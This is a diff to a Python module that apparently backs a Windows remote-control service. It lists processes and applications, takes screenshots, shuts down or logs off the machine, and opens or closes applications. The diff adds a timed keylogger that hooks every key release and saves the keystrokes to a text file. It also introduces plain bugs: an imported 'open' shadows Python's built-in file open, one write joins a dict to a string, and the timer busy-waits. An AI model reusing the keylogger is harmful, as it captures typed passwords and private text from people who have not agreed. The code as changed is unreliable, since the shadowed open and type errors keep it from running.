@@ -1,9 +1,9 @@
 import wmi
 import subprocess
 import os
-import logging
+import time
 import keyboard
-import cv2 as cv
+from AppOpener import open, close
 from pynput.keyboard import Listener
 from PIL import ImageGrab
 from PIL import Image
@@ -15,8 +15,12 @@ def listRunningProcess():
     for process in f.Win32_Process():
         processInfo = {"PID": process.ProcessId, "Name": process.Name}
         runningProcess.append(processInfo)
-
-    return runningProcess
+    outputDir = os.path.join("ServiceOutput", "list_processes.txt")
+    sortedProcess = sorted(runningProcess, key=lambda process: process["Name"])
+    with open(outputDir, "w") as file:
+        for process in sortedProcess:
+            file.write(process + "\n")
+    return 1
 
 
 def listRunningApplication():
@@ -30,7 +34,12 @@ def listRunningApplication():
         if line:
             runningApp.append(line)
 
-    return runningApp
+    outputDir = os.path.join("ServiceOutput", "list_app.txt")
+    with open(outputDir, "w") as file:
+        for app in runningApp:
+            if app != "Description" and app != "-----------":
+                file.write(app + "\n")
+    return 1
 
 
 def screenshot():
@@ -40,21 +49,51 @@ def screenshot():
     id = len(os.listdir(screenshotDir))
     name = "screenshot" + str(id) + ".png"
     screenshotImage.save(os.path.join(screenshotDir, name))
+    return 1
 
 
-def keylogger():
+def keylogger(duration):
     recorded_keys = []
+    escape = False
 
     def on_key_event(e):
+        nonlocal escape
         if e.event_type == keyboard.KEY_UP:
             key = e.name
-            recorded_keys.append(key)
+            if key == "esc":
+                escape = True
+            else:
+                recorded_keys.append(key)
 
     keyboard.hook(on_key_event)
-    keyboard.wait("esc")
+    start = time.time()
+    while (time.time() - start) < duration and not escape:
+        pass
 
-    return recorded_keys
+    keyboard.unhook_all()
+    outputDir = os.path.join("ServiceOutput", "key_logger.txt")
+    with open(outputDir, "w") as file:
+        for kl in recorded_keys:
+            file.write(kl + " ")
+    return 1
 
 
 def shutdown():
     os.system("shutdown /s /t 1")
+
+
+def logout():
+    os.system("shutdown -l")
+
+
+def removeSpace(string):
+    return string.replace(" ", "")
+
+
+def closeApplication(process_name):
+    process_name = removeSpace(process_name)
+    close(process_name.lower())
+
+
+def openApplication(appName):
+    open(appName.lower())
